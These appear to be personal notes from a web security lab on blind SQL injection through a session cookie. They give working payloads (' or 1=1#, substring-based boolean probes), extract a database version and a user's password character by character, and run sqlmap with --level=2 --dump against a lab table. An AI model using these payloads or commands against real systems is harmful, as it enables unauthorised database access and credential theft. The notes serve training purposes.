![[Pasted image 20230718193629.png]]

url encode " or 1=1# and send but we get no response
try  single quote ' but that dosent work as well

```sh
sqlmap -r req.txt
```

req.txt contains HTTP request

![[Pasted image 20230718194403.png]]

Once we send the POST request containing username and password, a cookie is set and that cookie is set in subsequent GET requests



HTTP response after submitting username and password that contains the cookie
![[Pasted image 20230718194720.png]]

subsequent GET requests

![[Pasted image 20230718194809.png]]


append ' or 1=1# at the end of cookie

![[Pasted image 20230718195206.png]]

and we get a valid response

***This is Blind SQL Injection since the query dosent give us any data from the tables rather it only changes behaviour of the page 

eg :
i/p:
' and 1=2#
which is a false query we get 

o/p:

![[Pasted image 20230718201748.png]]

so it does validate the cookie and if given false SQL code it dosent validate the user but if given correct SQL code, it validates the user but dosent give us any tables

SQL substring :
SUBSTRING(_string_, _start_, _length_)

new payload
to check what the first character is

i/p:
' and substring('a',1,1)='1'#
if the first character of string provided in substring  'a' or not

so to check the version

i/p:
' and substring((select version()),1,1)='7'#
put select version() in () because it has to resolve first
version not 7, try 8

i/p:
' and substring((select version()),1,1)='8'#
o/p:
![[Pasted image 20230718203059.png]]

and it is accepted so it is version 8.x.x

now find the third character since second cahracter will be a dot(.)

i/p:
' and substring((select version()),1,3)='8.0'#
and we get a valid o/p

now find the final character

i/p:
' and substring((select version()),1,5)='8.0.3'#

o/p:
![[Pasted image 20230718203356.png]]

now to find password

i/p:
' and substring((select password from injection0x02 where username='jessamy'),1,1)='a'#

(select password from injection0x02 where username='jessamy') entire thing inside ()
because it has to resolve as a whole and has to be resolved first

loop through all characters to find first alphabet of the password

send to intruder and loop through all characters

match at alphabet z

i/p:
' and substring((select password from injection0x02 where username='jessamy'),1,1)='z'#

o/p:
![[Pasted image 20230718204354.png]]

use sqlmap now

```sh
sqlmap -r req2.txt --level=2
```


to use sql map in cookies need to add
--level=2

no need to url encode cookie values since we got our payload working without URL encoding cookie value

![[Pasted image 20230718205131.png]]

it gave us the payload to use


```sh
sqlmap -r req2.txt --level=2 --dump
```

dump the payload we got 

```sh
sqlmap -r req2.txt --level=2 --dump -T injection0x02
```
-T:table name

![[Pasted image 20230718205513.png]]

-----
we got a match true for 'z'='Z' which is something to be lloked carefully in SQL 

---